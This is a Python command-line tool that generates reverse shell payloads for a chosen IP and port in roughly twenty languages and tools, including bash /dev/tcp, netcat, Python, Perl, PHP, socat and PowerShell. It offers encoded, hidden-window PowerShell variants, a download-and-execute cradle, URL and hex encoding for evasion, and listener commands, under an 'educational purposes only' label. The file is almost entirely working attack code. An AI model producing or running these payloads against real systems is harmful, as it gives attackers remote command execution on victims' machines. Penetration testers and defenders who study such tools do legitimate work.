#!/usr/bin/env python3
"""
Reverse Shell Generator - Enhanced Edition
Generates reverse shell payloads for various languages and platforms
Educational purposes only - Use responsibly and legally
"""

import sys
import base64
import urllib.parse
import os
import re
from typing import Dict, Callable, List, Tuple

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'
    GRAY = '\033[90m'

class ReverseShellGenerator:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        
        # Categorized shells for better organization
        self.categories = {
            'Linux Shells': ['bash', 'bash_tcp', 'bash_udp', 'nc', 'nc_openbsd', 'socat', 'telnet', 'awk'],
            'Scripting Languages': ['python', 'python3', 'perl', 'php', 'ruby', 'lua', 'nodejs'],
            'Windows': ['powershell', 'powershell_base64', 'powershell_encoded'],
            'Compiled Languages': ['java', 'golang'],
            'Other': ['xterm']
        }
        
        self.shells: Dict[str, Callable[[], str]] = {
            'bash': self.bash_shell,
            'bash_tcp': self.bash_tcp_shell,
            'bash_udp': self.bash_udp_shell,
            'nc': self.netcat_shell,
            'nc_openbsd': self.netcat_openbsd_shell,
            'python': self.python_shell,
            'python3': self.python3_shell,
            'perl': self.perl_shell,
            'php': self.php_shell,
            'ruby': self.ruby_shell,
            'java': self.java_shell,
            'powershell': self.powershell_shell,
            'powershell_base64': self.powershell_base64_shell,
            'powershell_encoded': self.powershell_encoded_shell,
            'nodejs': self.nodejs_shell,
            'socat': self.socat_shell,
            'awk': self.awk_shell,
            'lua': self.lua_shell,
            'golang': self.golang_shell,
            'telnet': self.telnet_shell,
            'xterm': self.xterm_shell,
        }
        
        # Shell descriptions
        self.descriptions = {
            'bash': 'Standard bash reverse shell using /dev/tcp',
            'bash_tcp': 'Alternative bash TCP reverse shell',
            'bash_udp': 'Bash UDP reverse shell',
            'nc': 'Traditional netcat with -e flag',
            'nc_openbsd': 'Netcat for OpenBSD (no -e flag)',
            'python': 'Python 2 reverse shell',
            'python3': 'Python 3 reverse shell with PTY',
            'perl': 'Perl socket-based reverse shell',
            'php': 'PHP reverse shell using fsockopen',
            'ruby': 'Ruby TCP socket reverse shell',
            'java': 'Java Runtime.exec reverse shell',
            'powershell': 'PowerShell TCP client reverse shell',
            'powershell_base64': 'PowerShell base64 encoded payload',
            'powershell_encoded': 'PowerShell with full encoding',
            'nodejs': 'Node.js net module reverse shell',
            'socat': 'Socat reverse shell (very stable)',
            'awk': 'AWK-based reverse shell',
            'lua': 'Lua socket reverse shell',
            'golang': 'Golang reverse shell (requires compilation)',
            'telnet': 'Telnet-based reverse shell',
            'xterm': 'X11 xterm reverse shell',
        }

    def validate_ip(self) -> bool:
        """Validate IP address format"""
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if not re.match(pattern, self.ip):
            return False
        octets = self.ip.split('.')
        return all(0 <= int(octet) <= 255 for octet in octets)

    def validate_port(self) -> bool:
        """Validate port number"""
        return 1 <= self.port <= 65535

    def bash_shell(self) -> str:
        """Standard bash reverse shell"""
        return f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"

    def bash_tcp_shell(self) -> str:
        """Bash TCP reverse shell (alternative)"""
        return f"0<&196;exec 196<>/dev/tcp/{self.ip}/{self.port}; sh <&196 >&196 2>&196"

    def bash_udp_shell(self) -> str:
        """Bash UDP reverse shell"""
        return f"sh -i >& /dev/udp/{self.ip}/{self.port} 0>&1"

    def netcat_shell(self) -> str:
        """Netcat reverse shell"""
        return f"nc -e /bin/sh {self.ip} {self.port}"

    def netcat_openbsd_shell(self) -> str:
        """Netcat OpenBSD reverse shell (no -e flag)"""
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.ip} {self.port} >/tmp/f"

    def python_shell(self) -> str:
        """Python 2 reverse shell"""
        return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip}",{self.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

    def python3_shell(self) -> str:
        """Python 3 reverse shell"""
        return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip}",{self.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""

    def perl_shell(self) -> str:
        """Perl reverse shell"""
        return f"""perl -e 'use Socket;$i="{self.ip}";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""

    def php_shell(self) -> str:
        """PHP reverse shell"""
        return f"""php -r '$sock=fsockopen("{self.ip}",{self.port});exec("/bin/sh -i <&3 >&3 2>&3");'"""

    def ruby_shell(self) -> str:
        """Ruby reverse shell"""
        return f"""ruby -rsocket -e'f=TCPSocket.open("{self.ip}",{self.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

    def java_shell(self) -> str:
        """Java reverse shell"""
        return f"""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{self.ip}/{self.port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()"""

    def powershell_shell(self) -> str:
        """PowerShell reverse shell"""
        return f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("{self.ip}",{self.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""

    def powershell_base64_shell(self) -> str:
        """PowerShell reverse shell (base64 encoded)"""
        ps_command = f'$client = New-Object System.Net.Sockets.TCPClient("{self.ip}",{self.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
        return f"powershell -e {encoded}"

    def powershell_encoded_shell(self) -> str:
        """PowerShell with additional encoding"""
        ps_command = f'IEX(New-Object Net.WebClient).DownloadString("http://{self.ip}:{self.port}/shell.ps1")'
        encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
        return f"powershell -enc {encoded}"

    def nodejs_shell(self) -> str:
        """Node.js reverse shell"""
        return f"""(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({self.port}, "{self.ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();"""

    def socat_shell(self) -> str:
        """Socat reverse shell"""
        return f"socat TCP:{self.ip}:{self.port} EXEC:/bin/sh"

    def awk_shell(self) -> str:
        """AWK reverse shell"""
        return f"""awk 'BEGIN {{s = "/inet/tcp/0/{self.ip}/{self.port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }}}} while(c != "exit") close(s); }}}}' /dev/null"""

    def lua_shell(self) -> str:
        """Lua reverse shell"""
        return f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{self.ip}','{self.port}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """

    def golang_shell(self) -> str:
        """Golang reverse shell"""
        return f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{self.ip}:{self.port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""

    def telnet_shell(self) -> str:
        """Telnet reverse shell"""
        return f"TF=$(mktemp -u);mkfifo $TF && telnet {self.ip} {self.port} 0<$TF | /bin/sh 1>$TF"

    def xterm_shell(self) -> str:
        """Xterm reverse shell"""
        return f"xterm -display {self.ip}:1"

    def generate(self, shell_type: str) -> str:
        """Generate a specific type of reverse shell"""
        if shell_type not in self.shells:
            raise ValueError(f"Unknown shell type: {shell_type}")
        return self.shells[shell_type]()

    def generate_all(self) -> Dict[str, str]:
        """Generate all available reverse shells"""
        return {name: func() for name, func in self.shells.items()}

    def list_shells(self) -> list:
        """List all available shell types"""
        return sorted(self.shells.keys())
    
    def get_category(self, shell_type: str) -> str:
        """Get the category of a shell type"""
        for category, shells in self.categories.items():
            if shell_type in shells:
                return category
        return "Other"
    
    def get_description(self, shell_type: str) -> str:
        """Get description of a shell type"""
        return self.descriptions.get(shell_type, "No description available")


def encode_payload(payload: str, encoding_type: str) -> str:
    """Encode payload with specified encoding"""
    if encoding_type == 'url':
        return urllib.parse.quote(payload)
    elif encoding_type == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif encoding_type == 'hex':
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    elif encoding_type == 'double_url':
        return urllib.parse.quote(urllib.parse.quote(payload))
    return payload


def copy_to_clipboard(text: str) -> bool:
    """Copy text to clipboard (cross-platform)"""
    try:
        if sys.platform == 'win32':
            os.system(f'echo {text} | clip')
        elif sys.platform == 'darwin':
            os.system(f'echo "{text}" | pbcopy')
        else:
            # Try xclip for Linux
            os.system(f'echo "{text}" | xclip -selection clipboard 2>/dev/null || echo "{text}" | xsel --clipboard 2>/dev/null')
        return True
    except:
        return False


def save_to_file(payload: str, filename: str) -> bool:
    """Save payload to file"""
    try:
        with open(filename, 'w') as f:
            f.write(payload)
        return True
    except Exception as e:
        print(f"{Colors.RED}[!] Error saving to file: {e}{Colors.RESET}")
        return False


def print_banner():
    """Print ASCII art banner"""
    banner = f"""{Colors.WHITE}
    ╦═╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗  ╔═╗╦ ╦╔═╗╦  ╦  
    ╠╦╝║╣ ╚╗╔╝║╣ ╠╦╝╚═╗║╣   ╚═╗╠═╣║╣ ║  ║  
    ╩╚═╚═╝ ╚╝ ╚═╝╩╚═╚═╝╚═╝  ╚═╝╩ ╩╚═╝╩═╝╩═╝
    ╔═╗╔═╗╔╗╔╔═╗╦═╗╔═╗╔╦╗╔═╗╦═╗
    ║ ╦║╣ ║║║║╣ ╠╦╝╠═╣ ║ ║ ║╠╦╝
    ╚═╝╚═╝╝╚╝╚═╝╩╚═╩ ╩ ╩ ╚═╝╩╚═
    {Colors.RESET}
    {Colors.YELLOW}[!] Educational purposes only - Use responsibly{Colors.RESET}
    {Colors.GRAY}    Enhanced Edition v2.0{Colors.RESET}
    """
    print(banner)


def print_usage():
    """Print usage information"""
    usage = f"""
{Colors.BOLD}Usage:{Colors.RESET}
    python revshell.py                          # Interactive mode
    python revshell.py <IP> <PORT> [OPTIONS]    # Command-line mode

{Colors.BOLD}Command-Line Options:{Colors.RESET}
    <SHELL_TYPE>        Generate specific shell type
    --list              List all available shell types
    --list-categories   List shells by category
    --all               Generate all available shells
    --interactive, -i   Launch interactive mode
    --encode <type>     Encode payload (url, base64, hex, double_url)
    --save <file>       Save payload to file
    --clipboard, -c     Copy payload to clipboard

{Colors.BOLD}Examples:{Colors.RESET}
    python revshell.py                                    # Interactive mode
    python revshell.py 10.10.10.5 4444 bash              # Generate bash shell
    python revshell.py 10.10.10.5 4444 python3 -c        # Generate and copy to clipboard
    python revshell.py 10.10.10.5 4444 bash --encode url # URL encode the payload
    python revshell.py 10.10.10.5 4444 --list            # List all shells
    python revshell.py 10.10.10.5 4444 --all             # Generate all shells
"""
    print(usage)


def print_categorized_shells(generator: ReverseShellGenerator):
    """Print shells organized by category"""
    print(f"\n{Colors.GREEN}[+] Available Shells by Category:{Colors.RESET}\n")
    
    for category, shells in generator.categories.items():
        print(f"{Colors.BOLD}{Colors.CYAN}{category}:{Colors.RESET}")
        for shell in shells:
            desc = generator.get_description(shell)
            print(f"  {Colors.YELLOW}•{Colors.RESET} {Colors.WHITE}{shell:<20}{Colors.RESET} {Colors.GRAY}- {desc}{Colors.RESET}")
        print()


def interactive_mode():
    """Interactive menu-driven mode"""
    print_banner()
    
    # Get IP and Port
    print(f"\n{Colors.BOLD}{Colors.CYAN}═══ Configuration ═══{Colors.RESET}\n")
    
    while True:
        ip = input(f"{Colors.GREEN}[?] Enter your IP address: {Colors.RESET}").strip()
        port_str = input(f"{Colors.GREEN}[?] Enter your port: {Colors.RESET}").strip()
        
        try:
            port = int(port_str)
            generator = ReverseShellGenerator(ip, port)
            
            if not generator.validate_ip():
                print(f"{Colors.RED}[!] Invalid IP address format{Colors.RESET}")
                continue
            
            if not generator.validate_port():
                print(f"{Colors.RED}[!] Invalid port (must be 1-65535){Colors.RESET}")
                continue
            
            break
        except ValueError:
            print(f"{Colors.RED}[!] Port must be a number{Colors.RESET}")
    
    while True:
        # Main menu
        print(f"\n{Colors.BOLD}{Colors.CYAN}═══ Main Menu ═══{Colors.RESET}\n")
        print(f"{Colors.YELLOW}1.{Colors.RESET} Generate specific shell")
        print(f"{Colors.YELLOW}2.{Colors.RESET} List all shells")
        print(f"{Colors.YELLOW}3.{Colors.RESET} List shells by category")
        print(f"{Colors.YELLOW}4.{Colors.RESET} Generate all shells")
        print(f"{Colors.YELLOW}5.{Colors.RESET} Change IP/Port")
        print(f"{Colors.YELLOW}6.{Colors.RESET} Exit")
        
        choice = input(f"\n{Colors.GREEN}[?] Select option: {Colors.RESET}").strip()
        
        if choice == '1':
            # Generate specific shell
            print(f"\n{Colors.CYAN}Available shell types:{Colors.RESET}")
            shells = generator.list_shells()
            for i, shell in enumerate(shells, 1):
                print(f"{i}. {shell}")
            
            shell_choice = input(f"\n{Colors.GREEN}[?] Enter shell type (name or number): {Colors.RESET}").strip()
            
            # Handle numeric choice
            if shell_choice.isdigit():
                idx = int(shell_choice) - 1
                if 0 <= idx < len(shells):
                    shell_type = shells[idx]
                else:
                    print(f"{Colors.RED}[!] Invalid selection{Colors.RESET}")
                    continue
            else:
                shell_type = shell_choice
            
            try:
                payload = generator.generate(shell_type)
                desc = generator.get_description(shell_type)
                category = generator.get_category(shell_type)
                
                print(f"\n{Colors.GREEN}[+] Generated {shell_type} reverse shell{Colors.RESET}")
                print(f"{Colors.GRAY}Category: {category}{Colors.RESET}")
                print(f"{Colors.GRAY}Description: {desc}{Colors.RESET}\n")
                print(f"{Colors.BOLD}Payload:{Colors.RESET}")
                print(f"{Colors.CYAN}{payload}{Colors.RESET}\n")
                
                # Post-generation options
                print(f"{Colors.YELLOW}Options:{Colors.RESET}")
                print(f"  {Colors.WHITE}c{Colors.RESET} - Copy to clipboard")
                print(f"  {Colors.WHITE}e{Colors.RESET} - Encode payload")
                print(f"  {Colors.WHITE}s{Colors.RESET} - Save to file")
                print(f"  {Colors.WHITE}l{Colors.RESET} - Show listener command")
                print(f"  {Colors.WHITE}Enter{Colors.RESET} - Return to menu")
                
                option = input(f"\n{Colors.GREEN}[?] Select option: {Colors.RESET}").strip().lower()
                
                if option == 'c':
                    if copy_to_clipboard(payload):
                        print(f"{Colors.GREEN}[+] Copied to clipboard!{Colors.RESET}")
                    else:
                        print(f"{Colors.YELLOW}[!] Clipboard copy may have failed{Colors.RESET}")
                
                elif option == 'e':
                    print(f"\n{Colors.CYAN}Encoding options:{Colors.RESET}")
                    print(f"  1. URL encoding")
                    print(f"  2. Base64 encoding")
                    print(f"  3. Hex encoding")
                    print(f"  4. Double URL encoding")
                    
                    enc_choice = input(f"\n{Colors.GREEN}[?] Select encoding: {Colors.RESET}").strip()
                    enc_map = {'1': 'url', '2': 'base64', '3': 'hex', '4': 'double_url'}
                    
                    if enc_choice in enc_map:
                        encoded = encode_payload(payload, enc_map[enc_choice])
                        print(f"\n{Colors.GREEN}[+] Encoded payload ({enc_map[enc_choice]}):{Colors.RESET}")
                        print(f"{Colors.CYAN}{encoded}{Colors.RESET}\n")
                        
                        if input(f"{Colors.GREEN}[?] Copy to clipboard? (y/n): {Colors.RESET}").strip().lower() == 'y':
                            copy_to_clipboard(encoded)
                            print(f"{Colors.GREEN}[+] Copied!{Colors.RESET}")
                
                elif option == 's':
                    filename = input(f"{Colors.GREEN}[?] Enter filename: {Colors.RESET}").strip()
                    if save_to_file(payload, filename):
                        print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.RESET}")
                
                elif option == 'l':
                    print(f"\n{Colors.YELLOW}[*] Listener command:{Colors.RESET}")
                    print(f"{Colors.CYAN}nc -lvnp {port}{Colors.RESET}\n")
                    print(f"{Colors.GRAY}Alternative (socat):{Colors.RESET}")
                    print(f"{Colors.CYAN}socat file:`tty`,raw,echo=0 tcp-listen:{port}{Colors.RESET}\n")
                
            except ValueError as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        
        elif choice == '2':
            # List all shells
            print(f"\n{Colors.GREEN}[+] Available shell types:{Colors.RESET}\n")
            for i, shell_type in enumerate(generator.list_shells(), 1):
                desc = generator.get_description(shell_type)
                print(f"  {i:2}. {Colors.WHITE}{shell_type:<20}{Colors.RESET} {Colors.GRAY}- {desc}{Colors.RESET}")
            input(f"\n{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
        
        elif choice == '3':
            # List by category
            print_categorized_shells(generator)
            input(f"{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
        
        elif choice == '4':
            # Generate all shells
            print(f"\n{Colors.GREEN}[+] Generating all reverse shells for {ip}:{port}{Colors.RESET}\n")
            all_shells = generator.generate_all()
            
            for name, payload in all_shells.items():
                desc = generator.get_description(name)
                category = generator.get_category(name)
                print(f"{Colors.BOLD}{Colors.BLUE}[{name}]{Colors.RESET} {Colors.GRAY}({category}){Colors.RESET}")
                print(f"{Colors.GRAY}{desc}{Colors.RESET}")
                print(f"{payload}\n")
            
            if input(f"{Colors.GREEN}[?] Save all to file? (y/n): {Colors.RESET}").strip().lower() == 'y':
                filename = input(f"{Colors.GREEN}[?] Enter filename: {Colors.RESET}").strip() or "all_shells.txt"
                with open(filename, 'w') as f:
                    f.write(f"Reverse Shells for {ip}:{port}\n")
                    f.write("=" * 50 + "\n\n")
                    for name, payload in all_shells.items():
                        f.write(f"[{name}]\n{payload}\n\n")
                print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.RESET}")
        
        elif choice == '5':
            # Change IP/Port
            ip = input(f"{Colors.GREEN}[?] Enter new IP address: {Colors.RESET}").strip()
            port = int(input(f"{Colors.GREEN}[?] Enter new port: {Colors.RESET}").strip())
            generator = ReverseShellGenerator(ip, port)
            print(f"{Colors.GREEN}[+] Updated to {ip}:{port}{Colors.RESET}")
        
        elif choice == '6':
            print(f"\n{Colors.CYAN}[*] Goodbye!{Colors.RESET}\n")
            sys.exit(0)
        
        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")


def main():
    # Interactive mode if no arguments
    if len(sys.argv) == 1:
        interactive_mode()
        return
    
    print_banner()

    # Check for interactive flag
    if '--interactive' in sys.argv or '-i' in sys.argv:
        interactive_mode()
        return

    if len(sys.argv) < 3:
        print_usage()
        sys.exit(1)

    ip = sys.argv[1]
    
    try:
        port = int(sys.argv[2])
    except ValueError:
        print(f"{Colors.RED}[!] Error: Port must be a number{Colors.RESET}")
        sys.exit(1)

    generator = ReverseShellGenerator(ip, port)
    
    # Validate IP and port
    if not generator.validate_ip():
        print(f"{Colors.RED}[!] Error: Invalid IP address format{Colors.RESET}")
        sys.exit(1)
    
    if not generator.validate_port():
        print(f"{Colors.RED}[!] Error: Invalid port (must be 1-65535){Colors.RESET}")
        sys.exit(1)

    # Parse flags
    use_clipboard = '--clipboard' in sys.argv or '-c' in sys.argv
    encoding = None
    save_file = None
    
    if '--encode' in sys.argv:
        try:
            idx = sys.argv.index('--encode')
            encoding = sys.argv[idx + 1]
        except (IndexError, ValueError):
            print(f"{Colors.RED}[!] Error: --encode requires an encoding type{Colors.RESET}")
            sys.exit(1)
    
    if '--save' in sys.argv:
        try:
            idx = sys.argv.index('--save')
            save_file = sys.argv[idx + 1]
        except (IndexError, ValueError):
            print(f"{Colors.RED}[!] Error: --save requires a filename{Colors.RESET}")
            sys.exit(1)

    # List available shells
    if len(sys.argv) > 3 and sys.argv[3] == '--list':
        print(f"{Colors.GREEN}[+] Available shell types:{Colors.RESET}\n")
        for i, shell_type in enumerate(generator.list_shells(), 1):
            desc = generator.get_description(shell_type)
            print(f"  {i:2}. {Colors.WHITE}{shell_type:<20}{Colors.RESET} {Colors.GRAY}- {desc}{Colors.RESET}")
        print()
        sys.exit(0)
    
    # List by category
    if len(sys.argv) > 3 and sys.argv[3] == '--list-categories':
        print_categorized_shells(generator)
        sys.exit(0)

    # Generate all shells
    if len(sys.argv) > 3 and sys.argv[3] == '--all':
        print(f"{Colors.GREEN}[+] Generating all reverse shells for {ip}:{port}{Colors.RESET}\n")
        all_shells = generator.generate_all()
        for name, payload in all_shells.items():
            desc = generator.get_description(name)
            category = generator.get_category(name)
            print(f"{Colors.BOLD}{Colors.BLUE}[{name}]{Colors.RESET} {Colors.GRAY}({category}){Colors.RESET}")
            print(f"{Colors.GRAY}{desc}{Colors.RESET}")
            print(f"{payload}\n")
        sys.exit(0)

    # Generate specific shell
    if len(sys.argv) < 4:
        print(f"{Colors.RED}[!] Error: Please specify a shell type or use --list/--all{Colors.RESET}")
        print_usage()
        sys.exit(1)

    shell_type = sys.argv[3]

    try:
        payload = generator.generate(shell_type)
        desc = generator.get_description(shell_type)
        category = generator.get_category(shell_type)
        
        # Apply encoding if requested
        if encoding:
            payload = encode_payload(payload, encoding)
            print(f"{Colors.YELLOW}[*] Applied {encoding} encoding{Colors.RESET}\n")
        
        print(f"{Colors.GREEN}[+] Generated {shell_type} reverse shell for {ip}:{port}{Colors.RESET}")
        print(f"{Colors.GRAY}Category: {category}{Colors.RESET}")
        print(f"{Colors.GRAY}Description: {desc}{Colors.RESET}\n")
        print(f"{Colors.BOLD}Payload:{Colors.RESET}")
        print(f"{Colors.CYAN}{payload}{Colors.RESET}\n")
        
        # Copy to clipboard if requested
        if use_clipboard:
            if copy_to_clipboard(payload):
                print(f"{Colors.GREEN}[+] Copied to clipboard!{Colors.RESET}\n")
            else:
                print(f"{Colors.YELLOW}[!] Could not copy to clipboard{Colors.RESET}\n")
        
        # Save to file if requested
        if save_file:
            if save_to_file(payload, save_file):
                print(f"{Colors.GREEN}[+] Saved to {save_file}{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}[*] Listener command:{Colors.RESET}")
        print(f"{Colors.CYAN}nc -lvnp {port}{Colors.RESET}\n")
        
    except ValueError as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        print(f"\n{Colors.YELLOW}[*] Use --list to see available shell types{Colors.RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()

